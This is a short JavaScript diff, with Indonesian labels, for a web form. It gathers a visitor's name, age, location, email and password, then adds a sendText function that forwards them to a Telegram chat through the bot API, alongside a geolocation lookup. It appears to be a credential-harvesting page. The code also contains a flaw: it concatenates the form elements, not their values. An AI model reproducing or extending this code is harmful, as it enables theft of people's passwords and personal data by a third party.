@@ -62,14 +62,13 @@ var tgl_lahir = document.getElementById('tgl_lahir')
 var email = document.getElementById('email')
 var kata_sandi = document.getElementById('kata_sandi')  
       var result = "\nNama : " + nama + "\nUmur : " + umur + "\nLokasi : " + lokasi + "\nEmail : " + email + "\nKata Sandi : " + kata_sandi
-      // Fungsi untuk mengi
-        document.getElementById('fm').addEventListener("submit", async e => {
+     function sendText() {
         const message = result
         if (message) {
           telegramRequest('sendMessage', { chat_id: chatId, text: message });
-          alert('s')
+         alert("Berhasil Mengirim")
   }
-        )}
+     }
       
       function getLocation() {
                         if (navigator.geolocation) {
